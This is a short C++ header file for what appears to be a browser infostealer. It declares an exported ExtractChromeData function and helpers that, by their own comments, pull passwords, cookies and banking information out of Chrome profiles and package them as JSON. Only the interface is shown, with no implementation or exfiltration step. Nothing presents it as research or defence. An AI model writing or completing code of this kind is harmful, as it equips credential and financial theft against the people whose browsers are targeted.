#pragma once

#include <string>
#include <vector>
#include <cstdint>

// Chrome browser data extraction functions

/**
 * Extract Chrome browser data including passwords, cookies, and banking info
 * @return JSON string containing extracted data
 */
extern "C" const char* ExtractChromeData();

/**
 * Get Chrome browser profiles
 * @return Vector of browser-profile path pairs
 */
std::vector<std::pair<std::string, std::string>> GetBrowserProfiles();

/**
 * Extract banking data from Chrome profile
 * @param profilePath Path to Chrome profile
 * @return Vector of banking information strings
 */
std::vector<std::string> ExtractBankingData(const std::string& profilePath);

/**
 * Convert bytes to string safely
 * @param bytes Vector of bytes
 * @return String representation
 */
std::string BytesToString(const std::vector<uint8_t>& bytes);

/**
 * Convert bytes to integer safely
 * @param bytes Vector of bytes
 * @return Integer value
 */
int BytesToInt(const std::vector<uint8_t>& bytes);

/**
 * Escape JSON special characters
 * @param str Input string
 * @return Escaped string safe for JSON
 */
std::string EscapeJson(const std::string& str);